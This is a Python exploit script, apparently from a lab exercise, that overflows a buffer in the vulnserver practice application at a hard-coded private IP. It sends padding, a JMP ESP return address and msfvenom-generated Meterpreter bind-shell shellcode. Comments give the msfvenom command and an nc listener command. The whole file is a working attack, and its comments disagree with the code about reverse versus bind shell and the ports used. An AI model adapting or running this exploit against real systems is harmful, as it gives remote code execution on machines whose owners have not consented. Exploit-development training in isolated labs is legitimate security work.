# To receive the reverse shell, run the following command at another terminal
#   nc -l -v -p 4444
# This module "socket" provides access to the BSD socket interface
import socket
# This module "struct" performs conversions between Python values
# and C structs represented as Python bytes objects.
import struct

HOST = '10.0.2.13'   # vitcim IP
PORT = 9999         # victim port

# Shellcode created by msfvenom
# msfvenom -p windows/meterpreter/bind_tcp RHOST=10.0.2.13 LPORT=11111 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a'
SHELL =  b""
SHELL += b"\xda\xd3\xbb\x12\xea\xb7\xd4\xd9\x74\x24\xf4\x5a"
SHELL += b"\x33\xc9\xb1\x57\x83\xc2\x04\x31\x5a\x16\x03\x5a"
SHELL += b"\x16\xe2\xe7\x16\x5f\x5b\x07\xe7\xa0\x04\x36\x35"
SHELL += b"\xc4\x4f\x6a\x89\x8c\xb5\x01\xbb\x82\xbe\x47\x28"
SHELL += b"\x10\xb2\x4f\x5f\x91\x79\xa9\x6e\x22\x4c\x75\x3c"
SHELL += b"\xe0\xce\x09\x3f\x35\x31\x30\xf0\x48\x30\x75\x46"
SHELL += b"\x26\xdd\x2b\x0e\x43\x73\xdb\x3b\x11\x48\xda\xeb"
SHELL += b"\x1d\xf0\xa4\x8e\xe2\x85\x18\x90\x32\xee\xf8\xb2"
SHELL += b"\x39\xb9\xe0\xe2\x3c\xe9\x95\xca\x4b\x31\xdc\xfd"
SHELL += b"\x4c\xc2\xea\x76\xb3\x03\x23\x49\x75\x64\x4e\xe5"
SHELL += b"\x77\xbc\x68\x15\x02\xb6\x8b\xa8\x15\x0d\xf6\x76"
SHELL += b"\x93\x92\x50\xfc\x03\x77\x61\xd1\xd2\xfc\x6d\x9e"
SHELL += b"\x91\x5b\x71\x21\x75\xd0\x8d\xaa\x78\x37\x04\xe8"
SHELL += b"\x5e\x93\x4d\xaa\xff\x82\x2b\x1d\xff\xd5\x93\xc2"
SHELL += b"\xa5\x9e\x31\x14\xd9\x5e\xca\x19\x87\xc8\x07\xd4"
SHELL += b"\x38\x09\x0f\x6f\x4a\x3b\x90\xdb\xc4\x77\x59\xc2"
SHELL += b"\x13\x77\x70\xb2\x8c\x86\x7a\xc3\x85\x4c\x2e\x93"
SHELL += b"\xbd\x65\x4e\x78\x3e\x89\x9b\x15\x35\x2c\x73\x08"
SHELL += b"\xb4\xa4\x72\xa6\x45\x51\x9e\x39\x95\x41\xa1\x93"
SHELL += b"\xbe\xea\x5f\x1c\xea\x8d\xd6\xfa\x86\x41\xbe\x55"
SHELL += b"\x3f\xa0\xe5\x6d\xd8\xdb\xcc\x17\xe6\x2b\x6b\x4f"
SHELL += b"\xe7\x33\x73\x27\x8f\x84\x9a\xff\xb0\x14\x89\x57"
SHELL += b"\x27\x9f\xdd\x63\x56\xa0\xc8\xc3\x0f\x37\x87\x85"
SHELL += b"\x62\xa9\x98\x8f\x17\x29\x0c\x34\xbe\x7e\xb8\x36"
SHELL += b"\xe7\x49\x67\xc8\xc2\xc9\x6f\x36\x93\xe0\x04\x01"
SHELL += b"\x01\xbb\x72\x6e\xc5\x3b\x82\x38\x8f\x3b\xea\x9c"
SHELL += b"\xeb\x6f\x0f\xe3\x21\x1c\x9c\x76\xca\x75\x71\xd0"
SHELL += b"\xa2\x7b\xac\x16\x6d\x83\x9b\x24\x6a\x7b\x5d\x2c"
SHELL += b"\x8a\xbf\x88\xf4\xf9\xd6\x09\x43\xe1\x34\xa7\xbe"
SHELL += b"\x8a\xe0\x22\x03\xd7\x12\x99\x40\xee\x90\x2b\x39"
SHELL += b"\x15\x88\x5e\x3c\x51\x0e\xb3\x4c\xca\xfb\xb3\xe3"
SHELL += b"\xeb\x29"

# Payload to inject into vulnserver
PAYLOAD = (
    b'KNOCK /.:/' +  # TRUN command of the server
    b'A' * 2002 +   # padding 
    # 62501205   FFE4             JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian; L means unsigned long
    struct.pack('<L', 0x6250151C) + 
    b'C' * 32 +
    SHELL
    # b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # no need really
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
